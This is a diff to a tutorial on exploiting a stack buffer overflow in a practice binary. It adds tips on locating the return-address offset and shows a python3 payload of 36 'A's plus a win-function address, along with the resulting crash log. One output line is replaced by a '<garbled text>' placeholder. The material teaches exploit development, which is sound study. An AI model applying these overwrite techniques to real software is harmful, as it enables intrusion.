@@ -104,8 +104,18 @@ sudo dmesg
 # [ 3926.193998] a.out[954]: segfault at 7f0041414141 ip 00007f0041414141 sp 00007fffcc4bdc20 error 14 in libc-2.31.so[7f8bfc9c3000+22000]
 ```
 
+Pay special attention to the line `segfault at 7f0041414141`.
+
 By playing around with the amount of 'A's we send, we can figure out that after
 36 of them, the return address begins.
+
+<details>
+    <summary>Tips & Tricks</summary>
+
+    Another way is to generate a random string with no repeating patterns.
+    Then just match the pattern from the IP against your input string to find
+    the exact position.
+</details>
 
 ## Address of the Win Function
 
@@ -157,7 +167,7 @@ clojure -e "(println (apply str (concat (repeat 36 \A) (map char '(0x60 0x11 0x4
 ```sh
 python3 -c 'print("A" * 36 + "\x60\x11\x40\x00\x00")' | ./a.out
 What is the secret phrase?
-The secret phrase is not: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`@
+The secret phrase is not: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<garbled text>
 You may now get yourself a piece of the great cake!
 Segmentation fault
 ```
